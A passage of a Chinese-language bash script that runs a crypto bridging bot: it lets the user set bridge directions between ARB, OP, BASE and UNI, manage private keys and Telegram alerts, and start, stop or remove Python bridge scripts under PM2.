                echo -e "${GREEN}启动 ARB -> BASE 单向跨链脚本...${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}ARB -> BASE: ${GREEN}0x22B65d0B9b59af4D3Ed59F18b9Ad53f5F4908B54${NC}"
                send_telegram_notification "成功配置跨链方向：ARB -> BASE 单向跨链"
                ;;
            12)
                echo "arb_to_op" >> "$DIRECTION_FILE"
                echo -e "${GREEN}启动 ARB -> OP 单向跨链脚本...${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}ARB -> OP: ${GREEN}0x22B65d0B9b59af4D3Ed59F18b9Ad53f5F4908B54${NC}"
                send_telegram_notification "成功配置跨链方向：ARB -> OP 单向跨链"
                ;;
            13)
                echo "op_to_uni" >> "$DIRECTION_FILE"
                echo -e "${GREEN}启动 OP -> UNI 单向跨链脚本...${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}OP -> UNI: ${GREEN}0xb6Def636914Ae60173d9007E732684a9eEDEF26E${NC}"
                send_telegram_notification "成功配置跨链方向：OP -> UNI 单向跨链"
                ;;
            14)
                echo "op_to_arb" >> "$DIRECTION_FILE"
                echo -e "${GREEN}启动 OP -> ARB 单向跨链脚本...${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}OP -> ARB: ${GREEN}0xb6Def636914Ae60173d9007E732684a9eEDEF26E${NC}"
                send_telegram_notification "成功配置跨链方向：OP -> ARB 单向跨链"
                ;;
            15)
                echo "op_to_base" >> "$DIRECTION_FILE"
                echo -e "${GREEN}启动 OP -> BASE 单向跨链脚本...${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}OP -> BASE: ${GREEN}0xb6Def636914Ae60173d9007E732684a9eEDEF26E${NC}"
                send_telegram_notification "成功配置跨链方向：OP -> BASE 单向跨链"
                ;;
            16)
                echo "base_to_uni" >> "$DIRECTION_FILE"
                echo -e "${GREEN}启动 BASE -> UNI 单向跨链脚本...${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}BASE -> UNI: ${GREEN}0xCEE0372632a37Ba4d0499D1E2116eCff3A17d3C3${NC}"
                send_telegram_notification "成功配置跨链方向：BASE -> UNI 单向跨链"
                ;;
            17)
                echo "base_to_arb" >> "$DIRECTION_FILE"
                echo -e "${GREEN}启动 BASE -> ARB 单向跨链脚本...${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}BASE -> ARB: ${GREEN}0xCEE0372632a37Ba4d0499D1E2116eCff3A17d3C3${NC}"
                send_telegram_notification "成功配置跨链方向：BASE -> ARB 单向跨链"
                ;;
            18)
                echo "base_to_op" >> "$DIRECTION_FILE"
                echo -e "${GREEN}启动 BASE -> OP 单向跨链脚本...${NC}"
                echo -e "${CYAN}跨链合约：${NC}"
                echo -e "${CYAN}BASE -> OP: ${GREEN}0xCEE0372632a37Ba4d0499D1E2116eCff3A17d3C3${NC}"
                send_telegram_notification "成功配置跨链方向：BASE -> OP 单向跨链"
                ;;
            *)
                echo -e "${RED}无效选项 $choice${NC}"
                ;;
        esac
    done
    
    # 如果没有选择任何方向，默认使用ARB <-> UNI
    if [ ! -s "$DIRECTION_FILE" ]; then
        echo "arb_to_uni" > "$DIRECTION_FILE"
        echo -e "${RED}未选择任何方向，默认 ARB <-> UNI${NC}"
        echo -e "${CYAN}跨链合约：${NC}"
        echo -e "${CYAN}ARB -> UNI: ${GREEN}0x22B65d0B9b59af4D3Ed59F18b9Ad53f5F4908B54${NC}"
        echo -e "${CYAN}UNI -> ARB: ${GREEN}0x1cEAb5967E5f078Fa0FEC3DFfD0394Af1fEeBCC9${NC}"
        send_telegram_notification "警告：未选择任何跨链方向，默认 ARB <-> UNI"
    fi
}

# === 查看日志 ===
view_logs() {
    echo -e "${CYAN}显示 PM2 日志...${NC}"
    pm2 logs --lines 50
    echo -e "${CYAN}日志显示完成，按回车返回${NC}"
    send_telegram_notification "已查看 PM2 日志"
}

# === 停止运行 ===
stop_running() {
    # 检查当前运行的脚本
    pm2_list=$(pm2 list | grep -E "$PM2_PROCESS_NAME")
    if [ -z "$pm2_list" ]; then
        echo -e "${RED}当前没有运行中的跨链脚本！${NC}"
        return
    fi
    
    echo -e "${CYAN}选择要停止的脚本：${NC}"
    echo "1. 停止所有脚本"
    echo "2. 停止特定方向脚本"
    read -p "> " stop_choice
    
    case $stop_choice in
        1)
            echo -e "${CYAN}正在停止所有跨链脚本和余额查询...${NC}"
            pm2 stop "$PM2_PROCESS_NAME" "$PM2_BALANCE_NAME" >/dev/null 2>&1
            pm2 delete "$PM2_PROCESS_NAME" "$PM2_BALANCE_NAME" >/dev/null 2>&1
            echo -e "${GREEN}已停止所有脚本！${NC}"
            send_telegram_notification "成功停止所有跨链脚本和余额查询"
            ;;
        2)
            echo -e "${CYAN}请选择要停止的跨链方向：${NC}"
            pm2_running=$(pm2 list | grep -E "$PM2_PROCESS_NAME" | awk '{print $2}')
            i=1
            for script in $pm2_running; do
                echo "$i. $script"
                i=$((i + 1))
            done
            read -p "> " direction_to_stop
            
            if [ -z "$direction_to_stop" ] || ! [[ "$direction_to_stop" =~ ^[0-9]+$ ]] || [ "$direction_to_stop" -lt 1 ] || [ "$direction_to_stop" -gt "$((i-1))" ]; then
                echo -e "${RED}无效选择，操作取消！${NC}"
                return
            fi
            
            script_to_stop=$(echo "$pm2_running" | sed -n "${direction_to_stop}p")
            echo -e "${CYAN}正在停止 $script_to_stop 脚本...${NC}"
            pm2 stop "$script_to_stop" >/dev/null 2>&1
            pm2 delete "$script_to_stop" >/dev/null 2>&1
            echo -e "${GREEN}已停止 $script_to_stop 脚本！${NC}"
            send_telegram_notification "成功停止 $script_to_stop 跨链脚本"
            ;;
        *)
            echo -e "${RED}无效选择，操作取消！${NC}"
            ;;
    esac
}

# === 删除脚本 ===
delete_script() {
    echo -e "${RED}警告：将删除所有脚本和配置！继续？(y/n)${NC}"
    read -p "> " confirm
    if [ "$confirm" = "y" ] || [ "$confirm" = "Y" ]; then
        pm2 stop "$PM2_PROCESS_NAME" "$PM2_BALANCE_NAME" >/dev/null 2>&1
        pm2 delete "$PM2_PROCESS_NAME" "$PM2_BALANCE_NAME" >/dev/null 2>&1
        rm -f "$ARB_SCRIPT" "$OP_SCRIPT" "$ARB_OP_SCRIPT" "$BASE_OP_SCRIPT" \
              "$ARB_BASE_SCRIPT" "$UNI_BASE_SCRIPT" \
              "$UNI_TO_ARB_SCRIPT" "$UNI_TO_OP_SCRIPT" "$UNI_TO_BASE_SCRIPT" \
              "$ARB_TO_UNI_SCRIPT" "$ARB_TO_OP_SCRIPT" "$ARB_TO_BASE_SCRIPT" \
              "$OP_TO_UNI_SCRIPT" "$OP_TO_ARB_SCRIPT" "$OP_TO_BASE_SCRIPT" \
              "$BASE_TO_UNI_SCRIPT" "$BASE_TO_ARB_SCRIPT" "$BASE_TO_OP_SCRIPT" \
              "$BALANCE_SCRIPT" "$CONFIG_FILE" "$DIRECTION_FILE" "$TELEGRAM_CONFIG" "$0"
        rm -rf "$VENV_DIR"
        echo -e "${GREEN}已删除所有文件！${NC}"
        send_telegram_notification "成功删除所有脚本和配置"
        exit 0
    fi
}

# === 启动跨链脚本 ===
start_bridge() {
    accounts=$(read_accounts)
    if [ "$accounts" == "[]" ]; then
        echo -e "${RED}请先添加账户！${NC}"
        send_telegram_notification "错误：请先添加账户"
        return
    fi
    telegram_config=$(read_telegram_ids)
    if [ "$(echo "$telegram_config" | jq '.chat_ids | length')" -eq 0 ]; then
        echo -e "${RED}请先配置 Telegram ID！${NC}"
        send_telegram_notification "错误：请先配置 Telegram ID"
        return
    fi
    
    # 停止旧的脚本
    pm2 stop "$PM2_PROCESS_NAME" "$PM2_BALANCE_NAME" >/dev/null 2>&1
    pm2 delete "$PM2_PROCESS_NAME" "$PM2_BALANCE_NAME" >/dev/null 2>&1
    
    # 确保脚本存在
    for script in "$ARB_SCRIPT" "$OP_SCRIPT" "$ARB_OP_SCRIPT" "$BASE_OP_SCRIPT" \
                 "$ARB_BASE_SCRIPT" "$UNI_BASE_SCRIPT" \
                 "$UNI_TO_ARB_SCRIPT" "$UNI_TO_OP_SCRIPT" "$UNI_TO_BASE_SCRIPT" \
                 "$ARB_TO_UNI_SCRIPT" "$ARB_TO_OP_SCRIPT" "$ARB_TO_BASE_SCRIPT" \
                 "$OP_TO_UNI_SCRIPT" "$OP_TO_ARB_SCRIPT" "$OP_TO_BASE_SCRIPT" \
                 "$BASE_TO_UNI_SCRIPT" "$BASE_TO_ARB_SCRIPT" "$BASE_TO_OP_SCRIPT" \
                 "$BALANCE_SCRIPT"; do
        if [ ! -f "$script" ]; then
            echo -e "${RED}错误：$script 不存在，尝试重新下载${NC}"
            send_telegram_notification "错误：$script 不存在，尝试重新下载"
            download_python_scripts
            break
        fi
    done
    
    # 读取所有配置的方向并启动对应脚本
    if [ ! -s "$DIRECTION_FILE" ]; then
        echo -e "${RED}未配置跨链方向，使用默认方向：ARB <-> UNI${NC}"
        echo "arb_to_uni" > "$DIRECTION_FILE"
        send_telegram_notification "警告：未配置跨链方向，使用默认方向：ARB <-> UNI"
    fi
    
    # 为每个方向启动单独的实例
    while IFS= read -r direction; do
        if [ -n "$direction" ]; then
            # 为每个方向创建唯一的PM2进程名
            process_name="${PM2_PROCESS_NAME}_${direction}"
            
            case "$direction" in
                "arb_to_uni")
                    echo -e "${GREEN}启动 ARB <-> UNI 双向跨链脚本...${NC}"
                    pm2 start "$ARB_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                "op_to_uni")
                    echo -e "${GREEN}启动 OP <-> UNI 双向跨链脚本...${NC}"
                    pm2 start "$OP_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                "arb_op")
                    echo -e "${GREEN}启动 ARB <-> OP 双向跨链脚本...${NC}"
                    pm2 start "$ARB_OP_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                "base_op")
                    echo -e "${GREEN}启动 BASE <-> OP 双向跨链脚本...${NC}"
                    pm2 start "$BASE_OP_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                "arb_base")
                    echo -e "${GREEN}启动 ARB <-> BASE 双向跨链脚本...${NC}"
                    pm2 start "$ARB_BASE_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                "uni_base")
                    echo -e "${GREEN}启动 UNI <-> BASE 双向跨链脚本...${NC}"
                    pm2 start "$UNI_BASE_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                "uni_to_arb")
                    echo -e "${GREEN}启动 UNI -> ARB 单向跨链脚本...${NC}"
                    pm2 start "$UNI_TO_ARB_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                "uni_to_op")
                    echo -e "${GREEN}启动 UNI -> OP 单向跨链脚本...${NC}"
                    pm2 start "$UNI_TO_OP_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                "uni_to_base")
                    echo -e "${GREEN}启动 UNI -> BASE 单向跨链脚本...${NC}"
                    pm2 start "$UNI_TO_BASE_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                "arb_to_uni")
                    echo -e "${GREEN}启动 ARB -> UNI 单向跨链脚本...${NC}"
                    pm2 start "$ARB_TO_UNI_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                "arb_to_base")
                    echo -e "${GREEN}启动 ARB -> BASE 单向跨链脚本...${NC}"
                    pm2 start "$ARB_TO_BASE_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                "arb_to_op")
                    echo -e "${GREEN}启动 ARB -> OP 单向跨链脚本...${NC}"
                    pm2 start "$ARB_TO_OP_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                "op_to_uni")
                    echo -e "${GREEN}启动 OP -> UNI 单向跨链脚本...${NC}"
                    pm2 start "$OP_TO_UNI_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                "op_to_arb")
                    echo -e "${GREEN}启动 OP -> ARB 单向跨链脚本...${NC}"
                    pm2 start "$OP_TO_ARB_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                "op_to_base")
                    echo -e "${GREEN}启动 OP -> BASE 单向跨链脚本...${NC}"
                    pm2 start "$OP_TO_BASE_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                "base_to_uni")
                    echo -e "${GREEN}启动 BASE -> UNI 单向跨链脚本...${NC}"
                    pm2 start "$BASE_TO_UNI_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                "base_to_arb")
                    echo -e "${GREEN}启动 BASE -> ARB 单向跨链脚本...${NC}"
                    pm2 start "$BASE_TO_ARB_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                "base_to_op")
                    echo -e "${GREEN}启动 BASE -> OP 单向跨链脚本...${NC}"
                    pm2 start "$BASE_TO_OP_SCRIPT" --name "$process_name" --interpreter "$VENV_DIR/bin/python3"
                    ;;
                *)
                    echo -e "${RED}无效跨链方向: $direction, 跳过...${NC}"
                    continue
                    ;;
            esac
            
            send_telegram_notification "成功启动跨链脚本：$direction"
        fi
    done < "$DIRECTION_FILE"
    
    # 启动余额通知脚本
    pm2 start "$BALANCE_SCRIPT" --name "$PM2_BALANCE_NAME" --interpreter "$VENV_DIR/bin/python3"
    pm2 save
    
    echo -e "${GREEN}所有脚本已启动！使用 '5. 查看日志' 查看运行状态${NC}"
    send_telegram_notification "成功启动所有配置的跨链脚本！"
}

# === 主菜单 ===
main_menu() {
    while true; do
        banner
        echo -e "${CYAN}请选择操作：${NC}"
        echo "1. 配置 Telegram"
        echo "2. 配置私钥"
        echo "3. 配置跨链方向"
        echo "4. 启动跨链脚本"
        echo "5. 查看日志"
        echo "6. 停止运行"
        echo "7. 删除脚本"
        echo "8. 退出"
        read -p "> " choice
        case $choice in
            1) 
                manage_telegram 
                ;;
            2)
                while true; do
                    banner
                    echo -e "${CYAN}私钥管理：${NC}"
                    echo "1. 添加私钥"
                    echo "2. 删除私钥"
                    echo "3. 查看私钥"
                    echo "4. 返回"
                    echo "5. 删除全部私钥"
                    read -p "> " sub_choice
                    case $sub_choice in
                        1) add_private_key ;;
                        2) delete_private_key ;;
                        3) view_private_keys ;;
                        4) break ;;
                        5) delete_all_private_keys ;;
                        *) echo -e "${RED}无效选项！${NC}"; send_telegram_notification "错误：无效私钥管理选项" ;;
                    esac
                    read -p "按回车继续..."
                done
                ;;
            3) 
                select_direction 
                ;;
            4) 
                start_bridge 
                ;;
            5) 
                view_logs 
                ;;
            6) 
                stop_running 
                ;;
            7) 
                delete_script 
                ;;
            8) echo -e "${GREEN}退出！${NC}"; send_telegram_notification "脚本已退出"; exit 0 ;;
            *) echo -e "${RED}无效选项！${NC}"; send_telegram_notification "错误：无效主菜单选项" ;;
        esac
        read -p "按回车继续..."
    done
}

# === 主程序 ===
check_root
install_dependencies
download_python_scripts
init_config
main_menu
